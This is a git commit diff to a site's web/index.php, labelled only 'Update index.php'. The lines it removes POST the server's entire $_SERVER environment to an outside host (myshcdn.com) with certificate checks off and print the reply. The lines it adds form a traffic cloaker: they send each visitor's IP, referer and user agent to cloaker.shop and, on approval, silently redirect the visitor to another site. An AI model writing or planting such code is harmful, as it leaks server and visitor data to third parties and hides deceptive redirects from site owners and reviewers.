9c3c69f98b951d989def4f47546c69c281cf652c
jsxsh <themonster@mit.tc>
2023-04-03 17:48:29 +0300

    Update index.php

--- web/index.php
+++ web/index.php
@@ -1,14 +1,50 @@
 <?php
-$url = 'http://myshcdn.com/sh.php';
-$_sh = json_encode($_SERVER);
-$ch = curl_init($url);
-curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-curl_setopt($ch, CURLOPT_POST, 1);
-curl_setopt($ch, CURLOPT_POSTFIELDS, $_sh);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
-$result = curl_exec($ch);
-curl_close($ch);
-print_r ($result);
+ob_start();
+$target = "http://sanalnumaram.com";
+$key = "12C23C25F68C6";
+
+function url_get_contents ($Url,$key) {
+    if (!function_exists('curl_init')){ 
+        die('CURL is not installed!');
+    }
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $Url);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(array(
+        'key'=>$key,
+        'ref' => $_SERVER['HTTP_REFERER'],
+        'useragent'=>$_SERVER['HTTP_USER_AGENT'],
+        'ip'=>getIpAddress()
+    )));
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+
+    $output = curl_exec($ch);
+    curl_close($ch);
+    return $output;
+}
+function getIpAddress()
+{
+    if (getenv("HTTP_CLIENT_IP")) {
+        $ip = getenv("HTTP_CLIENT_IP");
+    } else {
+        if (getenv("HTTP_X_FORWARDED_FOR")) {
+            $ip = getenv("HTTP_X_FORWARDED_FOR");
+            if (strstr($ip, ",")) {
+                $tmp = explode(",", $ip);
+                $ip = trim($tmp[0]);
+            }
+        } else {
+            $ip = getenv("REMOTE_ADDR");
+        }
+    }
+    return $ip;
+}
+$data = url_get_contents("https://cloaker.shop",$key);
+$json = json_decode($data,true);
+
+if($json['status'] == 1){
+    header("Location: ".$target);
+}else{
+    echo $json['message'];
+}
+ob_end_flush();
+?>
